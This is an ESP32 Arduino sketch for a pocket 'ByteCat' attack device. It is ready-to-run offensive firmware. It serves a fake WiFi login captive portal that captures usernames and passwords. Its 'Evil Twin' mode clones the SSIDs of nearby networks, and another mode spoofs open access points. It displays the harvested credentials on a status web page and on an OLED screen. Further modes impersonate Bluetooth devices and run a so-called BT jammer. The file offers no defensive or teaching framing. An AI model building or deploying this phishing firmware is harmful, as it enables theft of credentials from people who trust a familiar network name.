#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
#include <BLEAdvertising.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_MODE 18
#define BTN_ACTION 19

AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

const char* const spoofSSIDs[] PROGMEM = {"FREE_WIFI", "HACKED_NET", "LOL_NET", "OPEN_WIFI"};
int currentSSID = 0, mode = 0, visitCount = 0;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 300;

String capturedCreds[10];
int credsCount = 0;

String targetSSIDs[10];
int numTargets = 0, selectedTarget = 0;

const char* const fakeBTNames[] PROGMEM = {"AirPods Pro", "JBL Speaker", "Logitech K380", "PS5 Controller"};
int currentBTProfile = 0;

BLEAdvertising* pAdvertising = nullptr;
BLEAdvertising* pBTJammerAdvertising = nullptr;
BLEServer* pBTJammerServer = nullptr;

// Mascot ASCII stored in PROGMEM
const char ByteCat_Happy_0[] PROGMEM = "  /\\_/\\ ";
const char ByteCat_Happy_1[] PROGMEM = " ( ^.^ )";
const char ByteCat_Happy_2[] PROGMEM = "  > ^ < ";

const char ByteCat_Sad_0[] PROGMEM = "  /\\_/\\ ";
const char ByteCat_Sad_1[] PROGMEM = " ( -.- )";
const char ByteCat_Sad_2[] PROGMEM = "  > ^ < ";

const char ByteCat_Blink_0[] PROGMEM = "  /\\_/\\ ";
const char ByteCat_Blink_1[] PROGMEM = " ( o.o )";
const char ByteCat_Blink_2[] PROGMEM = "  > ^ < ";

const char* const Mascot_Happy[] PROGMEM = {ByteCat_Happy_0, ByteCat_Happy_1, ByteCat_Happy_2};
const char* const Mascot_Sad[] PROGMEM = {ByteCat_Sad_0, ByteCat_Sad_1, ByteCat_Sad_2};
const char* const Mascot_Blink[] PROGMEM = {ByteCat_Blink_0, ByteCat_Blink_1, ByteCat_Blink_2};

enum MascotState {
  HAPPY,
  SAD,
  BLINK
};

MascotState currentMascotState = HAPPY;

// HTML captive portal page
const char html_page[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1.0'>
<title>WiFi Login</title>
<style>
  body { background:#f4f4f4; font-family:Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
  .container { background:#fff; padding:20px; box-shadow:0 0 10px gray; border-radius:8px; width: 300px; }
  h2 { color:#036; }
  input, button { width:100%; padding:10px; margin:10px 0; }
  button { background:#00a1e0; color:#fff; border:none; cursor:pointer; }
  .note { font-size:0.8em; color:#666; }
</style>
</head>
<body>
  <div class='container'>
    <h2>Connect to WiFi</h2>
    <form method='POST' action='/login'>
      <input name='user' placeholder='Username' required>
      <input name='pass' type='password' placeholder='Password' required>
      <button type='submit'>Login</button>
    </form>
    <div class='note'>By logging in, you accept the Terms and Conditions.</div>
  </div>
</body>
</html>
)rawliteral";

void printFromProgmem(const char* ptr) {
  char buffer[32];
  strcpy_P(buffer, ptr);
  display.println(buffer);
}

void showMascot(MascotState state) {
  if (state == HAPPY) {
    for (int i = 0; i < 3; i++) {
      display.setCursor(0, i * 8);
      printFromProgmem((const char*)pgm_read_ptr(&(Mascot_Happy[i])));
    }
  } else if (state == SAD) {
    for (int i = 0; i < 3; i++) {
      display.setCursor(0, i * 8);
      printFromProgmem((const char*)pgm_read_ptr(&(Mascot_Sad[i])));
    }
  } else if (state == BLINK) {
    for (int i = 0; i < 3; i++) {
      display.setCursor(0, i * 8);
      printFromProgmem((const char*)pgm_read_ptr(&(Mascot_Blink[i])));
    }
  }
}

void updateDisplay(const __FlashStringHelper* title, const String &info, int visitors, MascotState state) {
  display.clearDisplay();
  showMascot(state);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println(title);
  display.print(F("Info: "));
  display.println(info);
  display.print(F("Visitors: "));
  display.println(visitors);
  display.display();
}

void setupStandbyPortal() {
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP("ByteCat", "pedrolucas7i");  // sem senha para facilitar
  
  dnsServer.start(DNS_PORT, "*", apIP);
  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    String html = "<html><head><title>Status ByteCat</title></head><body>";
    html += "<h2>Status do ByteCat (Standby)</h2>";
    html += "<p>Visitantes: " + String(visitCount) + "</p>";
    html += "<h3>Credenciais Capturadas</h3><ul>";
    for (int i = 0; i < credsCount; i++) {
      html += "<li>" + capturedCreds[i] + "</li>";
    }
    if (credsCount == 0) html += "<li>Nenhuma credencial capturada.</li>";
    html += "</ul></body></html>";
    
    request->send(200, "text/html", html);
  });

  server.onNotFound([](AsyncWebServerRequest *request){
    request->redirect("/");
  });
  
  server.begin();
}


void showCredsDisplay() {
  display.clearDisplay();
  showMascot(BLINK);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println(F("Captured Credentials:"));
  if (credsCount > 0) {
    display.println(capturedCreds[credsCount - 1]);
    if (credsCount > 1)
      display.println(capturedCreds[credsCount - 2]);
  } else {
    display.println(F("None."));
  }
  display.display();
}

void resetSystem() {
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  server.end();
  dnsServer.stop();
  stopBTJammer();
  BLEDevice::deinit(true);
  visitCount = 0;
  credsCount = 0;
  delay(10);
}

void setupCaptive(const char* ssid) {
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid, "", 6);
  delay(200);
  dnsServer.start(DNS_PORT, "*", apIP);
  server.reset();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r) {
    visitCount++;
    r->send_P(200, "text/html", html_page);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *r) {
    String u = r->arg("user");
    String p = r->arg("pass");
    if (credsCount < 10) {
      capturedCreds[credsCount++] = "U:" + u + " P:" + p;
    }
    r->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest *r) {
    r->redirect("/");
  });

  server.begin();
}

void scanNetworks() {
  numTargets = WiFi.scanNetworks();
  for (int i = 0; i < numTargets && i < 10; i++) {
    targetSSIDs[i] = WiFi.SSID(i);
  }
}

void setupBLE(const char* deviceName) {
  BLEDevice::init(deviceName);
  BLEServer *pServer = BLEDevice::createServer();
  BLEService *pService = pServer->createService(BLEUUID((uint16_t)0x180F));
  pService->start();

  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->addServiceUUID(pService->getUUID());
  pAdvertising->setScanResponse(false);
  pAdvertising->setMinPreferred(0x06);
  pAdvertising->setMinPreferred(0x12);
  pAdvertising->start();
}

void stopBLE() {
  if (pAdvertising) {
    pAdvertising->stop();
    pAdvertising = nullptr;
  }
  BLEDevice::deinit(true);
}

void startBTJammer() {
  BLEDevice::init("BT_Jammer");
  pBTJammerServer = BLEDevice::createServer();
  BLEService* pService = pBTJammerServer->createService(BLEUUID((uint16_t)0x180D)); // Heart Rate Service UUID (exemplo)
  pService->start();

  pBTJammerAdvertising = BLEDevice::getAdvertising();
  pBTJammerAdvertising->addServiceUUID(pService->getUUID());
  pBTJammerAdvertising->setScanResponse(true);
  pBTJammerAdvertising->setMinPreferred(0x06);
  pBTJammerAdvertising->setMinPreferred(0x12);
  pBTJammerAdvertising->start();
}

void stopBTJammer() {
  if (pBTJammerAdvertising) {
    pBTJammerAdvertising->stop();
    pBTJammerAdvertising = nullptr;
  }
  if (pBTJammerServer) {
    pBTJammerServer = nullptr;
  }
  BLEDevice::deinit(true);
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_MODE, INPUT_PULLDOWN);
  pinMode(BTN_ACTION, INPUT_PULLDOWN);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Failed to initialize display!"));
    while (true);
  }

  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  updateDisplay(F("Standby"), "-", 0, HAPPY);

  WiFi.mode(WIFI_OFF);
  WiFi.softAPdisconnect(true);
}

void handleButtons() {
  if (millis() - lastDebounce > debounceDelay) {
    if (digitalRead(BTN_MODE) == HIGH) {
      lastDebounce = millis();
      mode = (mode + 1) % 8; // Cicla entre 8 modos: 0..7
      resetSystem();

      switch (mode) {
        case 0:
          resetSystem();
          setupStandbyPortal();
          updateDisplay(F("Standby"), "-", visitCount, HAPPY);
          break;

        case 1: // SSID Spoofing
          currentSSID = (currentSSID + 1) % 4;
          setupCaptive(spoofSSIDs[currentSSID]);
          updateDisplay(F("SSID Spoof"), String(spoofSSIDs[currentSSID]), visitCount, HAPPY);
          break;

        case 2: // Captive Portal
          setupCaptive("LOGIN_PORTAL");
          updateDisplay(F("Captive Portal"), F("LOGIN_PORTAL"), visitCount, HAPPY);
          break;

        case 3: // Evil Twin Attack
          WiFi.mode(WIFI_STA);
          WiFi.disconnect();
          delay(500);
          scanNetworks();
          selectedTarget = 0;
          if (numTargets > 0) {
            setupCaptive(targetSSIDs[selectedTarget].c_str());
            updateDisplay(F("Evil Twin"), targetSSIDs[selectedTarget], visitCount, HAPPY);
          } else {
            updateDisplay(F("Evil Twin"), F("No Networks"), visitCount, SAD);
          }
          break;

        case 4: // Mostrar credenciais capturadas
          showCredsDisplay();
          break;

        case 5: // BLE Spoofing
          currentBTProfile = (currentBTProfile) % 4;
          setupBLE(fakeBTNames[currentBTProfile]);
          updateDisplay(F("BLE Spoof"), String(fakeBTNames[currentBTProfile]), 0, HAPPY);
          break;

        case 6: // Reset / Standby (modo extra)
          updateDisplay(F("Reset"), "-", 0, BLINK);
          break;

        case 7: // Bluetooth Jammer
          WiFi.mode(WIFI_OFF); // Desliga WiFi para liberar rádio
          delay(200);
          startBTJammer();
          updateDisplay(F("BT Jammer"), F("Active"), 0, SAD);
          break;
      }
    }

    if (digitalRead(BTN_ACTION) == HIGH) {
      lastDebounce = millis();
      if (mode == 3 && numTargets > 0) { // Ciclar redes Evil Twin
        selectedTarget = (selectedTarget + 1) % numTargets;
        resetSystem();
        setupCaptive(targetSSIDs[selectedTarget].c_str());
        updateDisplay(F("Evil Twin"), targetSSIDs[selectedTarget], visitCount, HAPPY);
      } else if (mode == 5) { // Ciclar perfis BLE
        currentBTProfile = (currentBTProfile + 1) % 4;
        resetSystem();
        setupBLE(fakeBTNames[currentBTProfile]);
        updateDisplay(F("BLE Spoof"), String(fakeBTNames[currentBTProfile]), 0, HAPPY);
      } else if (mode == 7) { // Restart Bluetooth Jammer
        resetSystem();
        startBTJammer();
        updateDisplay(F("BT Jammer"), F("Active"), 0, SAD);
      } else {
        resetSystem();
        updateDisplay(F("Reset"), "-", 0, BLINK);
      }
    }
  }
}

void loop() {
  handleButtons();

  if (mode == 1 || mode == 2 || mode == 3) {
    dnsServer.processNextRequest();
  }

  // Mascot blinking animation
  static unsigned long lastBlinkToggle = 0;
  static bool blinkOn = false;
  unsigned long now = millis();
  if (now - lastBlinkToggle > 500) {
    blinkOn = !blinkOn;
    lastBlinkToggle = now;
    if (mode == 4) {
      showCredsDisplay();
    } else if (mode == 0) {
      updateDisplay(F("Standby"), "-", visitCount, blinkOn ? BLINK : HAPPY);
    } else if (mode == 7) {
      updateDisplay(F("BT Jammer"), F("Active"), 0, blinkOn ? SAD : BLINK);
    }
  }
}
